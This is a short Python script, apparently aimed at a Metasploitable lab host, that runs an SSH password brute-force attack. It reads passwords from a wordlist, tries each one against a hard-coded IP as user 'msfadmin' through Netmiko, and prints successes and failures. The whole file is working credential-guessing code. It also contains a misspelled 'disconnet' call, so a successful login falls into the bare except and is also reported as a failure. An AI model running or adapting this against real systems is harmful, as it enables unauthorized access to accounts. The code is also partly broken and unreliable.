#!/usr/bin/python

from netmiko import Netmiko

wordlist ='word.txt'
user = 'msfadmin'
ip = "11.11.11.171"

print("[*] - SSH Bruteforce Attack")
print("[*] - Target:", ip)

with open(wordlist, 'r') as _wordlist:
    for _line in _wordlist:
        _pass = _line.strip("\n")

        try:
            sshconn = Netmiko(ip, username=str(user), password=str(_pass), device_type="linux")
            print('[+] BINGO - Username:', user, 'Password:', _pass)
            sshconn.disconnet()

        except:
            print('[-] FAIL - Username:', user, 'Password:', _pass)
